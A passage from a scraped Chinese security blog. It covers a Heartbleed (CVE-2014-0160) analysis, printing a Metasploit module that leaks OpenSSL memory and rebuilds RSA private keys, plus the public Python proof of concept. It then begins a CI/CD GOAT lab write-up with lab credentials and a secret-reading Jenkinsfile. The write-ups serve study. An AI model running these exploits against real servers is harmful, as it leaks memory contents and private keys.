disconnect  end  #  # DATASTORE values  #  # If this is merely a check, set to the RFC-defined  # maximum padding length of 2^14. See:  # https://tools.ietf.org/html/rfc6520#section-4  # https://github.com/rapid7/metasploit-framework/pull/3252  def heartbeat_length    if @check_only      SAFE_CHECK_MAX_RECORD_LENGTH    else      datastore[&#x27;HEARTBEAT_LENGTH&#x27;]    end  end  def response_timeout    datastore[&#x27;RESPONSE_TIMEOUT&#x27;]  end  def tls_version    datastore[&#x27;TLS_VERSION&#x27;]  end  def dumpfilter    datastore[&#x27;DUMPFILTER&#x27;]  end  def max_keytries    datastore[&#x27;MAX_KEYTRIES&#x27;]  end  def xmpp_domain    datastore[&#x27;XMPPDOMAIN&#x27;]  end  def status_every    datastore[&#x27;STATUS_EVERY&#x27;]  end  def tls_callback    datastore[&#x27;TLS_CALLBACK&#x27;]  end  def leak_count    datastore[&#x27;LEAK_COUNT&#x27;]  end  #  # TLS Callbacks  #  def tls_smtp    # https://tools.ietf.org/html/rfc3207    get_data    sock.put(&quot;EHLO #&#123;Rex::Text.rand_text_alpha(10)&#125;\\r\\n&quot;)    res = get_data    unless res &amp;&amp; res =~ /STARTTLS/      return nil    end    sock.put(&quot;STARTTLS\\r\\n&quot;)    get_data  end  def tls_imap    # http://tools.ietf.org/html/rfc2595    get_data    sock.put(&quot;a001 CAPABILITY\\r\\n&quot;)    res = get_data    unless res &amp;&amp; res =~ /STARTTLS/i      return nil    end    sock.put(&quot;a002 STARTTLS\\r\\n&quot;)    get_data  end  def tls_postgres    # postgresql TLS - works with all modern pgsql versions - 8.0 - 9.3    # http://www.postgresql.org/docs/9.3/static/protocol-message-formats.html    get_data    # the postgres SSLRequest packet is a int32(8) followed by a int16(1234),    # int16(5679) in network format    psql_sslrequest = [8].pack(&#x27;N&#x27;)    psql_sslrequest &lt;&lt; [1234, 5679].pack(&#x27;n*&#x27;)    sock.put(psql_sslrequest)    res = get_data    unless res &amp;&amp; res =~ /S/      return nil    end    res  end  def tls_pop3    # http://tools.ietf.org/html/rfc2595    get_data    sock.put(&quot;CAPA\\r\\n&quot;)    res = get_data    if res.nil? || res =~ /^-/ || res !~ /STLS/      return nil    end    sock.put(&quot;STLS\\r\\n&quot;)    res = get_data    if res.nil? || res =~ /^-/      return nil    end    res  end  def jabber_connect_msg(hostname)    # http://xmpp.org/extensions/xep-0035.html    msg = &quot;&lt;stream:stream xmlns=&#x27;jabber:client&#x27; &quot;    msg &lt;&lt; &quot;xmlns:stream=&#x27;http://etherx.jabber.org/streams&#x27; &quot;    msg &lt;&lt; &quot;version=&#x27;1.0&#x27; &quot;    msg &lt;&lt; &quot;to=&#x27;#&#123;hostname&#125;&#x27;&gt;&quot;  end  def tls_jabber    sock.put(jabber_connect_msg(xmpp_domain))    res = get_data    if res &amp;&amp; res.include?(&#x27;host-unknown&#x27;)      jabber_host = res.match(/ from=&#x27;([\\w.]*)&#x27; /)      if jabber_host &amp;&amp; jabber_host[1]        disconnect        establish_connect        vprint_status(&quot;Connecting with autodetected remote XMPP hostname: #&#123;jabber_host[1]&#125;...&quot;)        sock.put(jabber_connect_msg(jabber_host[1]))        res = get_data      end    end    if res.nil? || res.include?(&#x27;stream:error&#x27;) || res !~ /&lt;starttls xmlns=[&#x27;&quot;]urn:ietf:params:xml:ns:xmpp-tls[&#x27;&quot;]/      vprint_error(&quot;Jabber host unknown. Please try changing the XMPPDOMAIN option.&quot;) if res &amp;&amp; res.include?(&#x27;host-unknown&#x27;)      return nil    end    msg = &quot;&lt;starttls xmlns=&#x27;urn:ietf:params:xml:ns:xmpp-tls&#x27;/&gt;&quot;    sock.put(msg)    res = get_data    return nil if res.nil? || !res.include?(&#x27;&lt;proceed&#x27;)    res  end  def tls_ftp    # http://tools.ietf.org/html/rfc4217    res = get_data    return nil if res.nil?    sock.put(&quot;AUTH TLS\\r\\n&quot;)    res = get_data    return nil if res.nil?    if res !~ /^234/      # res contains the error message      vprint_error(&quot;FTP error: #&#123;res.strip&#125;&quot;)      return nil    end    res  end  #  # Helper Methods  #  # Get data from the socket  # this ensures the requested length is read (if available)  def get_data(length = -1)    to_receive = length    data = &#x27;&#x27;    done = false    while done == false      begin        temp = sock.get_once(to_receive, response_timeout)      rescue EOFError        break      end      break if temp.nil?      data &lt;&lt; temp      if length != -1        to_receive -= temp.length        done = true if to_receive &lt;= 0      end    end    data  end  def to_hex_string(data)    data.each_byte.map &#123; |b| sprintf(&#x27;%02X &#x27;, b) &#125;.join.strip  end  # establishes a connect and parses the server response  def establish_connect    connect    unless tls_callback == &#x27;None&#x27;      vprint_status(&quot;Trying to start SSL via #&#123;tls_callback&#125;&quot;)      res = self.send(TLS_CALLBACKS[tls_callback])      if res.nil?        vprint_error(&quot;STARTTLS failed...&quot;)        return nil      end    end    vprint_status(&quot;Sending Client Hello...&quot;)    sock.put(client_hello)    server_resp = get_server_hello    if server_resp.nil?      vprint_error(&quot;Server Hello Not Found&quot;)      return nil    end    server_resp  end  # Generates a heartbeat request  def heartbeat_request(length)    payload = &quot;\\x01&quot;              # Heartbeat Message Type: Request (1)    payload &lt;&lt; [length].pack(&#x27;n&#x27;) # Payload Length: 65535    ssl_record(HEARTBEAT_RECORD_TYPE, payload)  end  # Generates, sends and receives a heartbeat message  def bleed    connect_result = establish_connect    return if connect_result.nil?    vprint_status(&quot;Sending Heartbeat...&quot;)    sock.put(heartbeat_request(heartbeat_length))    hdr = get_data(SSL_RECORD_HEADER_SIZE)    if hdr.nil? || hdr.empty?      vprint_error(&quot;No Heartbeat response...&quot;)      disconnect      return    end    unpacked = hdr.unpack(&#x27;Cnn&#x27;)    type = unpacked[0]    version = unpacked[1] # must match the type from client_hello    len = unpacked[2]    # try to get the TLS error    if type == ALERT_RECORD_TYPE      res = get_data(len)      alert_unp = res.unpack(&#x27;CC&#x27;)      alert_level = alert_unp[0]      alert_desc = alert_unp[1]      # http://tools.ietf.org/html/rfc5246#section-7.2      case alert_desc      when 0x46        msg = &#x27;Protocol error. Looks like the chosen protocol is not supported.&#x27;      else        msg = &#x27;Unknown error&#x27;      end      vprint_error(&quot;#&#123;msg&#125;&quot;)      disconnect      return    end    unless type == HEARTBEAT_RECORD_TYPE &amp;&amp; version == TLS_VERSION[tls_version]      vprint_error(&quot;Unexpected Heartbeat response header (#&#123;to_hex_string(hdr)&#125;)&quot;)      disconnect      return    end    heartbeat_data = get_data(heartbeat_length)    vprint_status(&quot;Heartbeat response, #&#123;heartbeat_data.length&#125; bytes&quot;)    disconnect    heartbeat_data  end  # Stores received data  def loot_and_report(heartbeat_data)    if heartbeat_data.to_s.empty?      vprint_error(&quot;Looks like there isn&#x27;t leaked information...&quot;)      return    end    print_good(&quot;Heartbeat response with leak, #&#123;heartbeat_data.length&#125; bytes&quot;)    report_vuln(&#123;      :host =&gt; rhost,      :port =&gt; rport,      :name =&gt; self.name,      :refs =&gt; self.references,      :info =&gt; &quot;Module #&#123;self.fullname&#125; successfully leaked info&quot;    &#125;)    if action.name == &#x27;DUMP&#x27; # Check mode, dump if requested.      pattern = dumpfilter      if pattern        match_data = heartbeat_data.scan(pattern).join      else        match_data = heartbeat_data      end      path = store_loot(        &#x27;openssl.heartbleed.server&#x27;,        &#x27;application/octet-stream&#x27;,        rhost,        match_data,        nil,        &#x27;OpenSSL Heartbleed server memory&#x27;      )      print_good(&quot;Heartbeat data stored in #&#123;path&#125;&quot;)    end    # Convert non-printable characters to periods    printable_data = heartbeat_data.gsub(/[^[:print:]]/, &#x27;.&#x27;)    # Keep this many duplicates as padding around the deduplication message    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round    # Remove duplicate characters    abbreviated_data = printable_data.gsub(/(.)\\1&#123;#&#123;(DEDUP_REPEATED_CHARS_THRESHOLD - 1)&#125;,&#125;/) do |s|      s[0, duplicate_pad] +      &#x27; repeated &#x27; + (s.length - (2 * duplicate_pad)).to_s + &#x27; times &#x27; +      s[-duplicate_pad, duplicate_pad]    end    # Show abbreviated data    vprint_status(&quot;Printable info leaked:\\n#&#123;abbreviated_data&#125;&quot;)  end  #  # Keydumping helper methods  #  # Tries to retrieve the private key  def get_keys    connect_result = establish_connect    disconnect    return if connect_result.nil?    print_status(&quot;Scanning for private keys&quot;)    count = 0    print_status(&quot;Getting public key constants...&quot;)    n, e = get_ne    if n.nil? || e.nil?      print_error(&quot;Failed to get public key, aborting.&quot;)    end    vprint_status(&quot;n: #&#123;n&#125;&quot;)    vprint_status(&quot;e: #&#123;e&#125;&quot;)    print_status(&quot;#&#123;Time.now.getutc&#125; - Starting.&quot;)    max_keytries.times &#123;      # Loop up to MAX_KEYTRIES times, looking for keys      if count % status_every == 0        print_status(&quot;#&#123;Time.now.getutc&#125; - Attempt #&#123;count&#125;...&quot;)      end      bleedresult = bleed      return unless bleedresult      p, q = get_factors(bleedresult, n) # Try to find factors in mem      unless p.nil? || q.nil?        key = key_from_pqe(p, q, e)        print_good(&quot;#&#123;Time.now.getutc&#125; - Got the private key&quot;)        print_status(key.export)        path = store_loot(          &#x27;openssl.heartbleed.server&#x27;,          &#x27;text/plain&#x27;,          rhost,          key.export,          nil,          &#x27;OpenSSL Heartbleed Private Key&#x27;        )        print_status(&quot;Private key stored in #&#123;path&#125;&quot;)        return      end      count += 1    &#125;    print_error(&quot;Private key not found. You can try to increase MAX_KEYTRIES and/or HEARTBEAT_LENGTH.&quot;)  end  # Returns the N and E params from the public server certificate  def get_ne    unless @cert      print_error(&quot;No certificate found&quot;)      return    end    return @cert.public_key.params[&#x27;n&#x27;], @cert.public_key.params[&#x27;e&#x27;]  end  # Tries to find pieces of the private key in the provided data  def get_factors(data, n)    # Walk through data looking for factors of n    psize = n.num_bits / 8 / 2    return if data.nil?    (0..(data.length-psize)).each&#123; |x|      # Try each offset of suitable length      can = OpenSSL::BN.new(data[x,psize].reverse.bytes.inject &#123;|a,b| (a &lt;&lt; 8) + b &#125;.to_s)      if can &gt; 1 &amp;&amp; can % 2 != 0 &amp;&amp; can.num_bytes == psize        # Only try candidates that have a chance...        q, rem = n / can        if rem == 0 &amp;&amp; can != n          vprint_good(&quot;Found factor at offset #&#123;x.to_s(16)&#125;&quot;)          p = can          return p, q        end      end    &#125;    return nil, nil  end  # Generates the private key from the P, Q and E values  def key_from_pqe(p, q, e)    n = p * q    phi = (p - 1) * (q - 1 )    d = OpenSSL::BN.new(e).mod_inverse(phi)    dmp1 = d % (p - 1)    dmq1 = d % (q - 1)    iqmp = q.mod_inverse(p)    asn1 = OpenSSL::ASN1::Sequence(      [        OpenSSL::ASN1::Integer(0),        OpenSSL::ASN1::Integer(n),        OpenSSL::ASN1::Integer(e),        OpenSSL::ASN1::Integer(d),        OpenSSL::ASN1::Integer(p),        OpenSSL::ASN1::Integer(q),        OpenSSL::ASN1::Integer(dmp1),        OpenSSL::ASN1::Integer(dmq1),        OpenSSL::ASN1::Integer(iqmp)      ]    )    key = OpenSSL::PKey::RSA.new(asn1.to_der)    key  end  #  # SSL/TLS packet methods  #  # Creates and returns a new SSL record with the provided data  def ssl_record(type, data)    record = [type, TLS_VERSION[tls_version], data.length].pack(&#x27;Cnn&#x27;)    record &lt;&lt; data  end  # generates a CLIENT_HELLO ssl/tls packet  def client_hello    # Use current day for TLS time    time_temp = Time.now    time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i    hello_data = [TLS_VERSION[tls_version]].pack(&#x27;n&#x27;) # Version TLS    hello_data &lt;&lt; [time_epoch].pack(&#x27;N&#x27;)    # Time in epoch format    hello_data &lt;&lt; Rex::Text.rand_text(28)   # Random    hello_data &lt;&lt; &quot;\\x00&quot;                    # Session ID length    hello_data &lt;&lt; [CIPHER_SUITES.length * 2].pack(&#x27;n&#x27;) # Cipher Suites length (102)    hello_data &lt;&lt; CIPHER_SUITES.pack(&#x27;n*&#x27;)  # Cipher Suites    hello_data &lt;&lt; &quot;\\x01&quot;                    # Compression methods length (1)    hello_data &lt;&lt; &quot;\\x00&quot;                    # Compression methods: null    hello_data_extensions = &quot;\\x00\\x0f&quot;      # Extension type (Heartbeat)    hello_data_extensions &lt;&lt; &quot;\\x00\\x01&quot;     # Extension length    hello_data_extensions &lt;&lt; &quot;\\x01&quot;         # Extension data    hello_data &lt;&lt; [hello_data_extensions.length].pack(&#x27;n&#x27;)    hello_data &lt;&lt; hello_data_extensions    data = &quot;\\x01\\x00&quot;                      # Handshake Type: Client Hello (1)    data &lt;&lt; [hello_data.length].pack(&#x27;n&#x27;)  # Length    data &lt;&lt; hello_data    ssl_record(HANDSHAKE_RECORD_TYPE, data)  end  def get_ssl_record    hdr = get_data(SSL_RECORD_HEADER_SIZE)    unless hdr      vprint_error(&quot;No SSL record header received after #&#123;response_timeout&#125; seconds...&quot;)      return nil    end    len = hdr.unpack(&#x27;Cnn&#x27;)[2]    data = get_data(len) unless len.nil?    unless data      vprint_error(&quot;No SSL record contents received after #&#123;response_timeout&#125; seconds...&quot;)      return nil    end    hdr &lt;&lt; data  end  # Get and parse server hello response until we hit Server Hello Done or timeout  def get_server_hello    server_done = nil    ssl_record_counter = 0    remaining_data = get_ssl_record    while remaining_data &amp;&amp; remaining_data.length &gt; 0      ssl_record_counter += 1      ssl_unpacked = remaining_data.unpack(&#x27;CH4n&#x27;)      return nil if ssl_unpacked.nil? or ssl_unpacked.length &lt; 3      ssl_type = ssl_unpacked[0]      ssl_version = ssl_unpacked[1]      ssl_len = ssl_unpacked[2]      vprint_status(&quot;SSL record ##&#123;ssl_record_counter&#125;:&quot;)      vprint_status(&quot;\\tType:    #&#123;ssl_type&#125;&quot;)      vprint_status(&quot;\\tVersion: 0x#&#123;ssl_version&#125;&quot;)      vprint_status(&quot;\\tLength:  #&#123;ssl_len&#125;&quot;)      if ssl_type != HANDSHAKE_RECORD_TYPE        vprint_status(&quot;\\tWrong Record Type! (#&#123;ssl_type&#125;)&quot;)      else        ssl_data = remaining_data[5, ssl_len]        handshakes = parse_handshakes(ssl_data)        # Stop once we receive a SERVER_HELLO_DONE        if handshakes &amp;&amp; handshakes.length &gt; 0 &amp;&amp; handshakes[-1][:type] == HANDSHAKE_SERVER_HELLO_DONE_TYPE          server_done = true          break        end      end      remaining_data = get_ssl_record    end    server_done  end  # Parse Handshake data returned from servers  def parse_handshakes(data)    # Can contain multiple handshakes    remaining_data = data    handshakes = []    handshake_count = 0    while remaining_data &amp;&amp; remaining_data.length &gt; 0      hs_unpacked = remaining_data.unpack(&#x27;CCn&#x27;)      next if hs_unpacked.nil? or hs_unpacked.length &lt; 3      hs_type = hs_unpacked[0]      hs_len_pad = hs_unpacked[1]      hs_len = hs_unpacked[2]      hs_data = remaining_data[4, hs_len]      handshake_count += 1      vprint_status(&quot;\\tHandshake ##&#123;handshake_count&#125;:&quot;)      vprint_status(&quot;\\t\\tLength: #&#123;hs_len&#125;&quot;)      handshake_parsed = nil      case hs_type        when HANDSHAKE_SERVER_HELLO_TYPE          vprint_status(&quot;\\t\\tType:   Server Hello (#&#123;hs_type&#125;)&quot;)          handshake_parsed = parse_server_hello(hs_data)        when HANDSHAKE_CERTIFICATE_TYPE          vprint_status(&quot;\\t\\tType:   Certificate Data (#&#123;hs_type&#125;)&quot;)          handshake_parsed = parse_certificate_data(hs_data)        when HANDSHAKE_KEY_EXCHANGE_TYPE          vprint_status(&quot;\\t\\tType:   Server Key Exchange (#&#123;hs_type&#125;)&quot;)          # handshake_parsed = parse_server_key_exchange(hs_data)        when HANDSHAKE_SERVER_HELLO_DONE_TYPE          vprint_status(&quot;\\t\\tType:   Server Hello Done (#&#123;hs_type&#125;)&quot;)        else          vprint_status(&quot;\\t\\tType:   Handshake type #&#123;hs_type&#125; not implemented&quot;)      end      handshakes &lt;&lt; &#123;          :type     =&gt; hs_type,          :len      =&gt; hs_len,          :data     =&gt; handshake_parsed      &#125;      remaining_data = remaining_data[(hs_len + 4)..-1]    end    handshakes  end  # Parse Server Hello message  def parse_server_hello(data)    version = data.unpack(&#x27;H4&#x27;)[0]    vprint_status(&quot;\\t\\tServer Hello Version:           0x#&#123;version&#125;&quot;)    random = data[2,32].unpack(&#x27;H*&#x27;)[0]    vprint_status(&quot;\\t\\tServer Hello random data:       #&#123;random&#125;&quot;)    session_id_length = data[34,1].unpack(&#x27;C&#x27;)[0]    vprint_status(&quot;\\t\\tServer Hello Session ID length: #&#123;session_id_length&#125;&quot;)    session_id = data[35,session_id_length].unpack(&#x27;H*&#x27;)[0]    vprint_status(&quot;\\t\\tServer Hello Session ID:        #&#123;session_id&#125;&quot;)    # TODO Read the rest of the server hello (respect message length)    # TODO: return hash with data    true  end  # Parse certificate data  def parse_certificate_data(data)    # get certificate data length    unpacked = data.unpack(&#x27;Cn&#x27;)    cert_len_padding = unpacked[0]    cert_len = unpacked[1]    vprint_status(&quot;\\t\\tCertificates length: #&#123;cert_len&#125;&quot;)    vprint_status(&quot;\\t\\tData length: #&#123;data.length&#125;&quot;)    # contains multiple certs    already_read = 3    cert_counter = 0    while already_read &lt; cert_len      cert_counter += 1      # get single certificate length      single_cert_unpacked = data[already_read, 3].unpack(&#x27;Cn&#x27;)      single_cert_len_padding = single_cert_unpacked[0]      single_cert_len =  single_cert_unpacked[1]      vprint_status(&quot;\\t\\tCertificate ##&#123;cert_counter&#125;:&quot;)      vprint_status(&quot;\\t\\t\\tCertificate ##&#123;cert_counter&#125;: Length: #&#123;single_cert_len&#125;&quot;)      certificate_data = data[(already_read + 3), single_cert_len]      cert = OpenSSL::X509::Certificate.new(certificate_data)      # First received certificate is the one from the server      @cert = cert if @cert.nil?      #vprint_status(&quot;Got certificate: #&#123;cert.to_text&#125;&quot;)      vprint_status(&quot;\\t\\t\\tCertificate ##&#123;cert_counter&#125;: #&#123;cert.inspect&#125;&quot;)      already_read = already_read + single_cert_len + 3    end    # TODO: return hash with data    true  endend\n\n一个更轻量的常见 Python 版 exploit 为\n# Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]# Date: [2014-04-09]# Exploit Author: [Csaba Fitzl]# Vendor Homepage: [http://www.openssl.org/]# Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]# Version: [1.0.1f]# Tested on: [N/A]# CVE : [2014-0160]#!/usr/bin/env python# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)# The author disclaims copyright to this source code.# Modified by Csaba Fitzl for multiple SSL / TLS version supportimport sysimport structimport socketimport timeimport selectimport refrom optparse import OptionParseroptions = OptionParser(usage=&#x27;%prog server [options]&#x27;, description=&#x27;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#x27;)options.add_option(&#x27;-p&#x27;, &#x27;--port&#x27;, type=&#x27;int&#x27;, default=443, help=&#x27;TCP port to test (default: 443)&#x27;)def h2bin(x):    return x.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;hex&#x27;)# 支持多个协议版本version = []version.append([&#x27;SSL 3.0&#x27;,&#x27;03 00&#x27;])version.append([&#x27;TLS 1.0&#x27;,&#x27;03 01&#x27;])version.append([&#x27;TLS 1.1&#x27;,&#x27;03 02&#x27;])version.append([&#x27;TLS 1.2&#x27;,&#x27;03 03&#x27;])# 创建 Hello 握手包def create_hello(version):    hello = h2bin(&#x27;16 &#x27; + version + &#x27; 00 dc 01 00 00 d8 &#x27; + version + &#x27;&#x27;&#x27; 5343 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cfbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 0000 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 8800 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1cc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0cc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 1100 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 0403 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 1900 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 0800 06 00 07 00 14 00 15  00 04 00 05 00 12 00 1300 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 0000 0f 00 01 01&#x27;&#x27;&#x27;)    return hellodef create_hb(version):    # 创建请求心跳包，18代表Heartbeat类型，00 03代表请求包的实际长度    # 01代表 TLS1_HB_REQUEST 请求类型，40 00 代表 payload 长度值    hb = h2bin(&#x27;18 &#x27; + version + &#x27; 00 03 01 40 00&#x27;)        return hbdef hexdump(s):    for b in xrange(0, len(s), 16):        lin = [c for c in s[b : b + 16]]        hxdat = &#x27; &#x27;.join(&#x27;%02X&#x27; % ord(c) for c in lin)        pdat = &#x27;&#x27;.join((c if 32 &lt;= ord(c) &lt;= 126 else &#x27;.&#x27; )for c in lin)        print &#x27;  %04x: %-48s %s&#x27; % (b, hxdat, pdat)    printdef recvall(s, length, timeout=5):    endtime = time.time() + timeout    rdata = &#x27;&#x27;    remain = length    while remain &gt; 0:        rtime = endtime - time.time()        if rtime &lt; 0:            return None        r, w, e = select.select([s], [], [], 5)        if s in r:            data = s.recv(remain)            # EOF?            if not data:                return None            rdata += data            remain -= len(data)    return rdatadef recvmsg(s):    hdr = recvall(s, 5)    if hdr is None:        print &#x27;Unexpected EOF receiving record header - server closed connection&#x27;        return None, None, None    typ, ver, ln = struct.unpack(&#x27;&gt;BHH&#x27;, hdr)    pay = recvall(s, ln, 10)    if pay is None:        print &#x27;Unexpected EOF receiving record payload - server closed connection&#x27;        return None, None, None    print &#x27; ... received message: type = %d, ver = %04x, length = %d&#x27; % (typ, ver, len(pay))    return typ, ver, paydef hit_hb(s,hb):    s.send(hb)    # 发送心跳请求包    while True:        typ, ver, pay = recvmsg(s)    # 接收心跳响应包        if typ is None:            print &#x27;No heartbeat response received, server likely not vulnerable&#x27;            return False        if typ == 24:    # 24代表 Heartbeat 类型            print &#x27;Received heartbeat response:&#x27;            hexdump(pay)    # 以 十六进制 + 字符串 的形式打印出心跳响应包数据            if len(pay) &gt; 3:    # 返回的数据长度越过实际长度3，就说明越界访问到其它内存数据，此时就存在漏洞                print &#x27;WARNING: server returned more data than it should - server is vulnerable!&#x27;            else:                print &#x27;Server processed malformed heartbeat, but did not return any extra data.&#x27;            return True        if typ == 21:            print &#x27;Received alert:&#x27;            hexdump(pay)            print &#x27;Server returned error, likely not vulnerable&#x27;            return Falsedef main():    opts, args = options.parse_args()    if len(args) &lt; 1:        options.print_help()        return    for i in range(len(version)):        print &#x27;Trying &#x27; + version[i][0] + &#x27;...&#x27;        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        print &#x27;Connecting...&#x27;        sys.stdout.flush()        s.connect((args[0], opts.port))        print &#x27;Sending Client Hello...&#x27;        sys.stdout.flush()        s.send(create_hello(version[i][1]))        print &#x27;Waiting for Server Hello...&#x27;        sys.stdout.flush()        while True:            typ, ver, pay = recvmsg(s)            if typ == None:                print &#x27;Server closed connection without sending Server Hello.&#x27;                return            # Look for server hello done message.            if typ == 22 and ord(pay[0]) == 0x0E:                break        print &#x27;Sending heartbeat request...&#x27;        sys.stdout.flush()        s.send(create_hb(version[i][1]))        if hit_hb(s,create_hb(version[i][1])):            #Stop if vulnerable            breakif __name__ == &#x27;__main__&#x27;:    main()\n\n非常简单其实就是正常建立 TCP 连接，进行 TLS 握手 然后构造声明 payload 长度远大于实际 payload 长度的恶意心跳请求即可，在此不过多赘述\n漏洞修复Security Patch 主要为两个漏洞函数添加了对 s-&gt;s3-&gt;rrec.length 即 payload 长度值的判断，若声明长度大于实际长度则提前返回\nReferenceSecurity PatchThe Heartbleed BugNVD - CVE-2014-0160CVE - CVE-2014-0160漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CI/CD GOAT Writeup","url":"/2024/12/10/Tech%20Blog/CI-CD-GOAT-Writeup/","content":"CI&#x2F;CD GOAT 是一个用于帮助工程师和安全技术人员学习和实践 CI&#x2F;CD 安全技术的靶场，这一组十一个不同难度梯度的独立挑战基本涵盖了 OWASP Top 10 CI&#x2F;CD Security Risks\n\n\n部署Linux &amp; Maccurl -o cicd-goat/docker-compose.yaml --create-dirs https://raw.githubusercontent.com/cider-security-research/cicd-goat/main/docker-compose.yamlcd cicd-goat &amp;&amp; docker compose up -d\n\nWindows (Powershell)mkdir cicd-goat; cd cicd-goatcurl -o docker-compose.yaml https://raw.githubusercontent.com/cider-security-research/cicd-goat/main/docker-compose.yamlget-content docker-compose.yaml | %&#123;$_ -replace &quot;bridge&quot;,&quot;nat&quot;&#125;docker compose up -d\n\nTake the Challenge靶场启动后靶场 IP 共有 3 个地址可以访问，分别是\n\n\n\nPlatform\nPort\nDefault Username\nDefault Password\nDescription\n\n\n\nCTFd\n8000\nalice\nalice\n提交 Flag 的比赛平台\n\n\nJenkins\n8080\nalice\nalice\nCI&#x2F;CD 的 pipeline 管理平台\n\n\nGitea\n3000\nthealice\nthealice\n自建 Gitea 代码托管平台\n\n\nGitLab\n4000\nalice\nalice12345\n自建 Gitlab 代码托管平台\n\n\n\nDefault Username&#x2F;Password 的含义是，还存在其它的账户可用于登录，并且事实上还不少，基本都是弱密码，可简单爆破得到，比较重要的管理员账户及其口令为\n\n\n\nPlatform\nAdmin Username\nAdmin Password\n\n\n\nCTFd\nadmin\nciderland5#\n\n\nJenkins\nadmin\nciderland5#\n\n\nGitea\nred_queen\nciderland5#\n\n\nGitlab\nroot\nciderland5#\n\n\n可以登陆这些账号查看管理员是如何配置环境的，以及作弊直接更改 pipeline 拿 flag\n\n在这个靶场中的威胁建模中，攻击者(我们)被认为是恶意的开发者或者某些已经获取了在代码托管平台上的仓库的读&#x2F;写权限，并且在 Jenkins 中拥有读权限作为立足点的黑客，攻击者的目的是通过攻击 SCM 与 CI&#x2F;CD 平台窃取他人的秘密凭证或进行供应链投毒。因此，每一个挑战的 Flag 基本都是 CI&#x2F;CD 环境中以环境变量形式存在的 secret token，每一个挑战的基本流程基本都是 git clone 攻击者想要攻击的仓库，并通过 PR 等形式触发 CI&#x2F;CD 并查看 CI&#x2F;CD 平台的控制台日志输出获取想要窃取的信息。\nOWASP Top 10 CI&#x2F;CD Security Risks 简介CI&#x2F;CD，或者说持续集成&#x2F;部署技术能够将代码从工程师的开发环境自动化且高效地集成到生产环境，是任何现代软件组织的心脏。而随着 DevOps 学科，微服务架构，云技术与各类基础设施的发展，CI&#x2F;CD 系统得以更快、更灵活也更便捷地完成软件交付的工作。鉴于 CI&#x2F;CD 服务的广泛使用及其重要性，越来越多不同规模的攻击者都将注意力转移到了 CI&#x2F;CD 技术上，并发现了诸多基于 CI&#x2F;CD 技术得以重塑或拓展的攻击面。OWASP Foundation 在 2022 年发布了 OWASP CI&#x2F;CD 十大安全风险，其具体风险列表如下\n\n\n\nRisk 风险\nDetails 详情\n\n\n\nInsufficient Flow Control Mechanisms 不足的流程控制机制\nInsufficient-Flow-Control-Mechanisms\n\n\nInadequate Identity and Access Management 不当的身份识别和访问管理\nInadequate-Identity-And-Access-Management\n\n\nDependency Chain Abuse 依赖链滥用\nDependency-Chain-Abuse\n\n\nPoisoned Pipeline Execution (PPE) 管道投毒执行\nPoisoned-Pipeline-Execution\n\n\nInsufficient PBAC (Pipeline-Based Access Controls) 基于流水线的访问控制不足\nInsufficient-PBAC\n\n\nInsufficient Credential Hygiene 凭据清理不足\nInsufficient-Credential-Hygiene\n\n\nInsecure System Configuration 不安全的系统配置\nInsecure-System-Configuration\n\n\nUngoverned Usage of 3rd Party Services 第三方服务的不受控使用\nUngoverned-Usage-of-3rd-Party-Services\n\n\nImproper Artifact Integrity Validation 不正确的工件完整性验证\nImproper-Artifact-Integrity-Validation\n\n\nInsufficient Logging and Visibility 日志记录和可见性不足\nInsufficient-Logging-And-Visibility\n\n\n更多 DevSecOps 的基础知识或者说是完成这个靶场所需要的前置知识可见文末参考链接\nWriteupWhite RabbitRisks\nCICD-SEC-4: Poisoned Pipeline Execution (PPE)\nCICD-SEC-6: Insufficient Credential Hygiene\n\nAnalysis攻击者对这个仓库具有读写权限，CI&#x2F;CD 通过 Pr 触发，并由 Jenkinsfile 控制 CI&#x2F;CD 流。那么显而易见，攻击者能够进行 PPE 攻击，并且是直接 PPE 攻击 (D-PPE)。审计根目录下的 Jenkinsfile\npipeline &#123;    agent any    environment &#123;        PROJECT = &quot;src/urllib3&quot;    &#125;    stages &#123;        stage (&#x27;Install_Requirements&#x27;) &#123;            steps &#123;                sh &quot;&quot;&quot;                    virtualenv venv                    pip3 install -r requirements.txt || true                &quot;&quot;&quot;            &#125;        &#125;        stage (&#x27;Lint&#x27;) &#123;            steps &#123;                sh &quot;pylint $&#123;PROJECT&#125; || true&quot;            &#125;        &#125;        stage (&#x27;Unit Tests&#x27;) &#123;            steps &#123;                sh &quot;pytest&quot;            &#125;        &#125;    &#125;    post &#123;         always &#123;             cleanWs()        &#125;    &#125;&#125;\n\n\n不了解 Jenkinsfile 的语法的话可以通过文末提供的链接花五分钟快速学一下\n\n攻击者能够（结合 hint）发现 secret 存在全局范围的 Jenkins 凭证存储中，因此只需要在 Jenkinsfile 中添加读取 flag 的代码即可获取 flag\n\n需要注意的是靶场启用了 Masks Password 插件，因此直接输出的 flag 将会被屏蔽，需要编码输出。此后的大部分题目也需要编码输出处理。\n\n参考以下流程即可拿到 flag\n\nExploitpipeline &#123;    agent any    environment &#123;        PROJECT = &quot;src/urllib3&quot;    &#125;    stages &#123;        stage(&#x27;read_flag&#x27;) &#123;            steps &#123;                withCredentials([string(credentialsId: &#x27;flag1&#x27;, variable: 